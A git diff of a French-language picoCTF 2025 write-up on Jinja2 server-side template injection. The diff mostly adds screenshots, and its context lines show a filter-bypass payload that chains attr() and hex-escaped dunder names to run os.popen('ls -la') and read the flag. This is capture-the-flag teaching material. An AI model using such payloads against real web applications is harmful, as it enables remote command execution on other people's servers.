@@ -62,8 +62,8 @@ Fort de cette confirmation, essayons un payload SSTI classique pour exécuter de
 ```
 
 
-**Réponse du serveur :**
-![Uploading image.png…]()
+**Réponse du serveur :**   <img width="1784" height="623" alt="image" src="https://github.com/user-attachments/assets/e1316973-b92c-425d-914c-376e58cb1b54" />
+
 
 > Stop trying to break me >:(
 
@@ -93,6 +93,8 @@ Jinja2 fournit un filtre appelé **`attr()`** qui permet d'accéder à un attrib
 ```jinja2
 {{ 'foo'|attr('upper') }}
 ```
+<img width="1915" height="642" alt="image" src="https://github.com/user-attachments/assets/fb466451-f34d-4710-a115-64abe57929f7" />
+
 
 **Résultat :** `FOO` — La méthode `upper()` a été appelée via `attr()`.  
 On remplace donc chaque `.` par `|attr('nom_attribut')`.
@@ -118,6 +120,7 @@ Au lieu d'écrire `dict['cle']`, on utilise la méthode magique `__getitem__` vi
 ```jinja2
 |attr('__getitem__')('__builtins__')
 ```
+<img width="1679" height="427" alt="image" src="https://github.com/user-attachments/assets/e4e85597-0931-4111-98d7-e9d4cd26170d" />
 
 Équivaut à : `['__builtins__']`
 
@@ -141,6 +144,7 @@ request → request.application → application.__globals__ → __builtins__ →
 {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls -la')|attr('read')()}}
 ```
 
+
 **Explication détaillée du payload :**
 
 | Segment | Équivalent Python | Utilité |
@@ -154,6 +158,8 @@ request → request.application → application.__globals__ → __builtins__ →
 | `\|attr('read')()` | `.read()` | Lit la sortie de la commande |
 
 **Résultat :** Liste complète des fichiers du répertoire courant, incluant le fichier `flag`.
+<img width="1920" height="1009" alt="image" src="https://github.com/user-attachments/assets/9556bd05-e63b-4ac4-86a0-21d81334ce4c" />
+
 
 ### 5.2. Lecture du flag
 
@@ -162,6 +168,7 @@ request → request.application → application.__globals__ → __builtins__ →
 ```
 
 **Résultat :** Le flag s'affiche directement dans la réponse.
+<img width="1920" height="420" alt="image" src="https://github.com/user-attachments/assets/47b86f77-913e-4f70-9ed7-fdbefcc343ef" />
 
 ---
 
@@ -211,7 +218,7 @@ Pour corriger cette vulnérabilité, le développeur devrait :
 
 ---
 
-**Auteur :**(https://github.com/exploit4040)  
+**Auteur :**[Yahaya Meddy](https://github.com/exploit4040)  
 **Plateforme :** picoCTF 2025  
 **Catégorie :** Web Exploitation — SSTI
 ```
